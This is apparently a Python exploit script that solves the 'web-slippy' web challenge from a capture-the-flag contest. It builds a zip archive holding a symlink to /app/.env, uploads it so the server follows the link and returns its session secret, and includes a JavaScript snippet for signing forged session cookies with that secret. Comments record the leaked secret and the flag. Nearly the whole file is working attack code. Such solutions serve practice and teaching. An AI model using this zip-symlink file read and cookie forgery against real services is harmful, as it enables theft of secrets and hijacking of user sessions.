import requests
import zipfile

# url = "http://localhost:3000"
url = "https://web-slippy-14677ca176ed2142.challs.tfcctf.com"

target_file = "/app/.env"
link_name = "mylink"

with zipfile.ZipFile("exp.zip", "w") as zf:
    info = zipfile.ZipInfo(link_name)
    info.external_attr = 0o120777 << 16
    zf.writestr(info, target_file)

with open("exp.zip", "rb") as f:
    data = f.read()

with requests.Session() as s:
    s.post(f"{url}/upload", files={"zipfile": ("exp.zip", data, "application/zip")})
    resp = s.get(f"{url}/files/{link_name}")
    print("/app/.env:", resp.text)
    session_secret = resp.text.split("SESSION_SECRET=")[1]

# /app/.env: SESSION_SECRET=3df35e5dd772dd98a6feb5475d0459f8e18e08a46f48ec68234173663fca377b

# npm install cookie-signature@1.2.2
"""
const signature = require("cookie-signature");
function sign(sessionId, secret) {
    return "s:" + signature.sign(sessionId, secret);
}
"""

# ...

# TFCCTF{3at_sl1P_h4Ck_r3p3at_5af9f1}
